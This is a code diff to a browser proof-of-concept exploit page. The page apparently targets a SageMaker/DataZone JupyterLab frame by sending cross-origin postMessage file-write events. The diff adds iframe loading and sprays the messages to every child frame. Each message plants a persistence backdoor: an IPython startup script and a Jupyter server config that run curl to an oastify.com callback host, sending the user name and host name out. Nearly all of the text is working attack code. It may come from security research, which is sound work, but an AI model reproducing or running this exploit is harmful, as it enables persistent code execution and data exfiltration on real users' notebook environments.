@@ -25,6 +25,7 @@
 
   <button id="launchBtn">Click Anywhere To Launch Exploit</button>
   <div id="status"></div>
+  <iframe id="target" style="width:100%;height:300px;margin-top:15px;border:1px solid #90b0e0;display:none;"></iframe>
 
 <script>
 var CALLBACK = '2nqdaq56ymdtf45fbkjtbga9w02rqje8.oastify.com';
@@ -38,52 +39,57 @@ function status(msg, cls) {
   document.getElementById('status').innerHTML += '<div class="' + (cls||'') + '">' + msg + '</div>';
 }
 
+function sendPayload(target, path, content, label) {
+  target.postMessage({
+    type: 'sagemaker:nbevent:OpenOrCreateFile',
+    payload: { type: 'file', path: path, content: content, format: 'text' }
+  }, '*');
+  status(label, 'ok');
+}
+
 function exploit() {
   var url = document.getElementById('url').value.trim();
-  var wait = parseInt(document.getElementById('wait').value) || 8000;
+  var wait = parseInt(document.getElementById('wait').value) || 12000;
 
-  var w = window.open(url, '_blank');
-  if (!w) { status('Popup blocked — allow popups and retry.', 'err'); return; }
-  status('Popup opened. Waiting ' + wait + 'ms for JupyterLab to load...', 'warn');
+  // Embed target as iframe — avoids popup blockers and close issues
+  var iframe = document.getElementById('target');
+  iframe.src = url;
+  iframe.style.display = 'block';
+  status('Loading target in iframe. Waiting ' + wait + 'ms...', 'warn');
 
   setTimeout(function() {
-    if (w.closed) { status('Popup was closed.', 'err'); return; }
+    var outer = iframe.contentWindow;
+    if (!outer) { status('Cannot access iframe contentWindow.', 'err'); return; }
 
-    // The JupyterLab instance is inside an iframe (sagemaker-ui-code-ide).
-    // Cross-origin: we can't access w.document, but w[0] gives us the
-    // first child frame's window, which we can postMessage into.
-    var target = w[0];
-    if (!target) {
-      status('Could not find iframe — try increasing wait time.', 'err');
-      return;
-    }
-    status('Found iframe window (w[0]). Sending payloads...', 'ok');
+    // The DataZone page itself has a nested iframe (sagemaker-ui-code-ide)
+    // containing JupyterLab. Try nested frame first, fall back to outer.
+    var target = outer[0] || outer;
+    var via = outer[0] ? 'nested iframe (outer[0])' : 'outer iframe directly';
+    status('Targeting: ' + via + '. Sending payloads...', 'ok');
 
-    // Attack 1: IPython startup script — auto-executes on every kernel start
-    target.postMessage({
-      type: 'sagemaker:nbevent:OpenOrCreateFile',
-      payload: {
-        type: 'file',
-        path: '.ipython/profile_default/startup/00-backdoor.py',
-        content: 'import os; os.system("curl https://' + CALLBACK + '/ipython-startup?user=$(whoami)\\&host=$(hostname)")',
-        format: 'text'
-      }
-    }, '*');
-    status('[1/2] Wrote .ipython/profile_default/startup/00-backdoor.py', 'ok');
+    // Also spray all child frames in case the index varies
+    var frames = [target];
+    try { for (var i = 0; i < outer.length; i++) frames.push(outer[i]); } catch(e) {}
+
+    frames.forEach(function(f) {
+      // Attack 1: IPython startup — executes on every kernel start
+      sendPayload(f,
+        '.ipython/profile_default/startup/00-backdoor.py',
+        'import os; os.system("curl https://' + CALLBACK + '/ipython-startup?user=$(whoami)\\&host=$(hostname)")',
+        '[1/2] Wrote .ipython/profile_default/startup/00-backdoor.py'
+      );
+    });
     status('       → Executes every time a Jupyter kernel starts', 'ok');
 
-    // Attack 2: Jupyter server config — executes on server restart
     setTimeout(function() {
-      target.postMessage({
-        type: 'sagemaker:nbevent:OpenOrCreateFile',
-        payload: {
-          type: 'file',
-          path: '.jupyter/jupyter_server_config.py',
-          content: 'import os; os.system("curl https://' + CALLBACK + '/jupyter-config?user=$(whoami)\\&host=$(hostname)")',
-          format: 'text'
-        }
-      }, '*');
-      status('[2/2] Wrote .jupyter/jupyter_server_config.py', 'ok');
+      frames.forEach(function(f) {
+        // Attack 2: Jupyter server config — executes on server restart
+        sendPayload(f,
+          '.jupyter/jupyter_server_config.py',
+          'import os; os.system("curl https://' + CALLBACK + '/jupyter-config?user=$(whoami)\\&host=$(hostname)")',
+          '[2/2] Wrote .jupyter/jupyter_server_config.py'
+        );
+      });
       status('       → Executes on Jupyter server restart', 'ok');
       status('Check Burp Collaborator for callbacks.', 'warn');
     }, 500);
